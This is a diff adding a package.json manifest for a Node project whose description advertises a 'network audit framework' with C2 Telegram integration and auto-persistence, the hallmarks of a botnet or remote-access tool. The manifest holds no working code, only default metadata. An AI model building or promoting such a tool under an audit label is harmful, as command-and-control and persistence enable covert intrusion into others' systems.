@@ -1,0 +1,12 @@
+{
+  "name": "telnet-x-supreme-the-grand-arch-v5.1",
+  "version": "1.0.0",
+  "description": "Advanced Network Audit Framework with 13 Heuristic AI Engines, C2 Telegram Integration, and Auto-Persistence Systems. Engineered for stability and remote intelligence",
+  "main": "index.js",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1"
+  },
+  "keywords": [],
+  "author": "",
+  "license": "ISC"
+}
